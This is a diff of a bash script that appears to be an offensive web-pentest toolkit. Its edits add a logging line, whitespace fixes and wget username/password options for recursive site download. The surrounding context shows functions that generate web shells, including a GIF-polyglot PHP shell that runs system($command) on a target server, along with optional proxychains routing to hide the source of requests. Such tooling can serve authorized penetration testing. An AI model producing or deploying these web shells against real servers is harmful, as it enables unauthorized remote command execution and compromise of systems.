@@ -26,6 +26,7 @@ extract_hidden_input() {
     else
         # Get specific form by ID or number
         if [[ "$target_form" =~ ^[0-9]+$ ]]; then
+            echo "Targeting form number: $target_form" >> $trail_log
             # Target by form number
             form_content=$(echo "$page" | awk -v target="$target_form" '
                 /<form/ { forms++; if(forms==target) start=1 }
@@ -169,7 +170,7 @@ create_php_webshell() {
         sed -E -i '/body/d' webshell.php
         sed -E -i '/title/d' webshell.php
         sed -E -i '/head/d' webshell.php
-        sed -E -i '/pre/d' webshell.php        
+        sed -E -i '/pre/d' webshell.php
     fi
 }
 
@@ -232,6 +233,7 @@ create_image_gif_webshell() {
     echo -e "GIF89a;\n<?php system($command); ?>" > webshell.php
 
 }
+
 
 create_nodejs_webshell() {
     cp $SCRIPTDIR/../js/node.js .
@@ -305,7 +307,11 @@ download_web_folder() {
     if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == true ]]; then
         proxy_option="proxychains -q "
     fi
-    ${proxy_option}wget -r -nH -R 'index.html*' --no-parent "$target_url"
+    local authentication_option=""
+    if [[ ! -z $username ]] && [[ ! -z $password ]]; then
+        authentication_option="--user=$username --password=$password "
+    fi
+    ${proxy_option}wget -r -nH -R 'index.html*' --no-parent $authentication_option "$target_url"
     popd || return 1
 }
 
